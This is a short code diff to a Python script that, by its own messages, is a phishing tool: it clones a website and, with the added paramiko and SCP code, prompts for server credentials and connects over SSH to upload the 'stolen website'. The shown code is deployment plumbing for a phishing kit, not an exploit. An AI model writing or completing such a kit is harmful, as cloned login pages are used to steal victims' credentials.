@@ -4,6 +4,11 @@ import os
 import time
 import subprocess
 import argparse
+import scp
+import paramiko
+import getpass
+from paramiko import SSHClient
+from scp import SCPClient
 from urllib.parse import urlparse
 
 parser = argparse.ArgumentParser()
@@ -42,8 +47,16 @@ def clone(website):
         # print("Ru roh raggy")
 
 def enable(website):
-    print("Uploading stolen website to personal website...")
+    print("Before starting our phisher we need your login info to upload to a server")
+    user = input("Enter username: ")
+    password = getpass.getpass("Enter password: ")
+    port = input("Enter port: ")
 
+    print("Uploading stolen website to personal website...")
+    ssh = SSHClient()
+    ssh.load_system_host_keys()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(website, port, user, password)
 
 def website_test(website):
     print(website)
